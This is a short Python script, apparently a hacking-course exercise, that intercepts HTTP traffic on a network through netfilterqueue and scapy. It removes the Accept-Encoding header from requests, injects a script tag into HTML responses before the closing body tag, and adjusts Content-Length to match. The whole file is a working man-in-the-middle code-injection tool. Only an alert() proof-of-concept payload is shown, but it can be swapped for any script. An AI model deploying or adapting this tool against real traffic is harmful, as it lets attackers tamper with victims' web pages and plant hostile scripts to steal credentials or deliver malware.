#!/usr/bin/env python


#when receiving a http packet, the load of the raw layer might contain the html code, but in a encoded format,
#so we need to decode it to get the actual html code, and then we can modify it
#the encoding can be of any type which you can find out by printing the load of the raw layer

import netfilterqueue
import scapy.all as scapy
import re



def set_load(packet, load): # Function to set the payload of a packet
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].dlen
    del packet[scapy.TCP].chksum
    return packet



def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload()) # Get the packet payload
    if scapy_packet.haslayer(scapy.Raw):
        load = scapy_packet[scapy.Raw].load
        if scapy_packet[scapy.TCP].dport == 80: # Check if the packet is a request
            print("[+] HTTP Request")
            load = re.sub("Accept-Encoding:.*?\\r\\n", "", load) # Remove the Accept-Encoding header
           
        
        elif scapy_packet[scapy.TCP].sport == 80:  # Check if the packet is a response
            print("[+] HTTP Response")
            injection_code = "<script>alert('Injected!')</script>" # Code to inject
            load = load.replace("</body>", injection_code + "</body>") # Inject a script into the response
            content_length_search = re.search("(?:Content-Length:\s)(\d*)", load) # Search for the Content-Length header
            if content_length_search and "text/html" in load: # Check if the Content-Length header is present and if the content type is HTML
                content_length = content_length_search.group(1) # Get the Content-Length value
                new_content_length = int(content_length) + len(injection_code) # Calculate the new Content-Length value
                load = load.replace(content_length, str(new_content_length)) # Replace the Content-Length value in the load

                


        if load != scapy_packet[scapy.Raw].load:
            new_packet = set_load(scapy_packet, load)
            packet.set_payload(str(new_packet))

    packet.accept() # Accept the packet
    


    
queue = netfilterqueue.NetfilterQueue() # Create a NetfilterQueue object
queue.bind(0, process_packet) # Bind the queue to the process_packet function
queue.run() # Start the queue

